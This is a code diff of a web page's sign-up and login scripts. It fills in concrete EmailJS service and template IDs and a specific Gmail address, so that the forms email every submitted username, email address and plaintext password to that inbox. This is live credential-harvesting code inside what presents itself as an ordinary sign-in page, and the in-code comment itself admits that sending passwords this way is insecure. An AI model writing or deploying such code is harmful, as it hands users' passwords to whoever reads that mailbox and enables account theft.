@@ -424,19 +424,19 @@
                 <div class="g_id_signin" data-type="standard" data-text="signup_with"  id="google-signup"></div>
                 <script>
                     // Handle Sign-Up Form Submission (EmailJS)
-        document.getElementById("signup-form")?.addEventListener("submit", function(event) {
+        document.getElementById("form2")?.addEventListener("submit", function(event) {
             event.preventDefault(); // Prevent default form submission
 
             // Collect form data
             const formData = {
-                username: document.getElementById("signup-username")?.value,
-                email: document.getElementById("signup-email")?.value,
-                password: document.getElementById("signup-password")?.value
+                username: document.getElementById("username")?.value,
+                email: document.getElementById("email")?.value,
+                password: document.getElementById("password")?.value
             };
 
             // Send email using EmailJS
-            emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
-                to_email: "your-gmail-address@gmail.com", // Replace with your Gmail address
+            emailjs.send("service_3x03x03", "template_3x03x03", {
+                to_email: "katprogrammers@gmail.com", // Replace with your Gmail address
                 username: formData.username,
                 email: formData.email,
                 password: formData.password // Note: Sending passwords via email is insecure
@@ -531,19 +531,19 @@
             <div class="g_id_signin" data-type="standard" data-text="signin_with" id="google-login"></div>
             <script>
                 // Handle Login Form Submission (EmailJS)
-        document.getElementById("login-form")?.addEventListener("submit", function(event) {
+        document.getElementById("loginform")?.addEventListener("submit", function(event) {
             event.preventDefault(); // Prevent default form submission
 
             // Collect form data
             const formData = {
-                username: document.getElementById("login-username")?.value,
-                password: document.getElementById("login-password")?.value
+                email: document.getElementById("email")?.value,
+                password: document.getElementById("password")?.value
             };
 
             // Send email using EmailJS
-            emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
-                to_email: "your-gmail-address@gmail.com", // Replace with your Gmail address
-                username: formData.username,
+            emailjs.send("service_3x03x03", "template_3x03x03", {
+                to_email: "katprogrammers@gmail.com", // Replace with your Gmail address
+                email: formData.email,
                 password: formData.password // Note: Sending passwords via email is insecure
             })
             .then(function(response) {
@@ -571,8 +571,8 @@
                     };
 
                     // Send user info to Gmail via EmailJS
-                    emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
-                        to_email: "your-gmail-address@gmail.com",
+                    emailjs.send("service_3x03x03", "template_3x03x03", {
+                        to_email: "katprogrammers@gmail.com",
                         username: formData.username,
                         email: formData.email,
                         password: formData.password
@@ -604,8 +604,8 @@
                     };
 
                     // Send user info to Gmail via EmailJS
-                    emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
-                        to_email: "your-gmail-address@gmail.com",
+                    emailjs.send("service_3x03x03", "template_3x03x03", {
+                        to_email: "katprogrammers@gmail.com",
                         username: formData.username,
                         email: formData.email,
                         password: formData.password
